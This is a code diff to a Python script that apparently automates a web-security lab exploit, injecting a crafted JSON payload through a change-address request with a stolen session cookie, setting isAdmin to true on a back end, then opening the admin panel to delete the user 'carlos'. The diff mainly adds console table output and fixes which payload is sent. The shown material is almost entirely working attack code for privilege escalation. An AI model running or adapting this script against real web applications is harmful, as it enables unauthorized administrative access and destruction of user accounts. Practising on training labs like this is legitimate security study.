@@ -10,6 +10,7 @@ from time import sleep
 import requests
 from rich.console import Console
 from rich.text import Text
+from rich.table import Table
 
 def pretty_print(t,color):
     text = Text()
@@ -59,8 +60,8 @@ def send_POST_to_change_address(malicious_json,cookie,LAB_URL,console):
     endpoint_POST = f"{LAB_URL}/my-account/change-address"
     headers = {"Cookie": f"session={cookie}"}
     response = requests.post(url=endpoint_POST, data=json.dumps(malicious_json), headers=headers)
-    console.print(pretty_print(f"Injected Response: {str(response.text)}","yellow"))
-    return response
+    t3=pretty_print(f"Injected Response: {str(response.text)}","yellow")
+    return response,t3
 
 
 def go_to_admin_panel(driver):
@@ -73,6 +74,8 @@ def delete_carlos(driver):
 
 def main(lab_url: str):
     c = Console()
+    table = Table()
+    table.add_column("History", style="cyan")
     driver = webdriver.Chrome()
     lab_url=lab_url.rstrip("/")
     current_url = login(driver, lab_url)
@@ -107,20 +110,28 @@ def main(lab_url: str):
         t2 = pretty_print(f"Malicious payload with json spaces: {str(json_malevolo)}","red")
         c.print(t2)
         sleep(2)
-        response =send_POST_to_change_address(json_malevolo, cookie, lab_url,c)
-
+        response,t3 =send_POST_to_change_address(json_malevolo, cookie, lab_url,c)
+        c.print(t3)
         sleep(1)
         if response.text != request_to_back_end.text:
             print("*** JSON SPACES HAS BEEN INJECTED ***")
             new_request = manipulate_json_after_json_spaces(json_malevolo)
-            request_to_back_end = requests.post(URL_BACKEND, data=json.dumps(json_malevolo), headers=headers)
-            pretty_print(f"Malicious payload with isAdmin setted to True: {str(json_malevolo)}","red")
-            print(request_to_back_end.text)
+            request_to_back_end = requests.post(URL_BACKEND, data=json.dumps(new_request), headers=headers)
+            t4=pretty_print(f"Malicious payload with isAdmin setted to True: {str(new_request)}","red")
+            c.print(t4)
+            t5 = pretty_print(request_to_back_end.text,"purple")
+            c.print(t5)
             sleep(1)
             driver.refresh()
             sleep(2)
             go_to_admin_panel(driver)
             sleep(2)
+            table.add_row(t1)
+            table.add_row(t2)
+            table.add_row(t3)
+            table.add_row(t4)
+            table.add_row(t5)
+            c.print(table)
             delete_carlos(driver)
             sleep(50)
         return 0
